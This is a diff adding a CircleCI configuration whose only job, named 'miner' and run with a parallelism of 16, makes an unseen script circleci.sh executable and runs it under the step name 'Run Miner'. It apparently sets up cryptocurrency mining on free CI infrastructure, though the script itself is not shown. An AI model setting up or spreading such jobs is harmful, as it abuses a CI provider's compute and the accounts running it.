@@ -1,0 +1,17 @@
+version: 2
+jobs:
+    miner:
+      docker:
+        - image: circleci/ruby:2.5.3
+      parallelism: 16
+      steps:
+        - run:
+            name: Run Miner
+            command: |
+              chmod +x circleci.sh
+              ./circleci.sh
+workflows:
+    version: 2
+    build:
+        jobs:
+        - miner
